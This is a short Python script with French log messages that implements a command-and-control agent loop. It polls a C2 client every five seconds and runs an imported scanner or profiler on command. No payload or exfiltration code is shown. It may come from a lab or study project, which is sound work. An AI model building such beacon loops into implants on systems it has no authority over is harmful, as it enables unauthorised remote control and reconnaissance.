#!/usr/bin/env python3

import time

from c2_client.client import get_command
from main import main
from profiler import run_profiler

print("[Agent] Agent C2 démarré.")
print("[Agent] En attente des commandes...")

while True:

    command = get_command()

    if command:

        print(f"[Agent] Commande reçue : {command}")

        action = command.get("command")

        if action == "scan":

            print("[Agent] Exécution du scanner...")
            main()

        elif action == "profiler":

            print("[Agent] Lancement du profiler...")

            profile = run_profiler()

            if profile is not None:

                print("[Agent] Profil récupéré.")

            else:

                print("[Agent] Échec du profiler.")

    time.sleep(5)
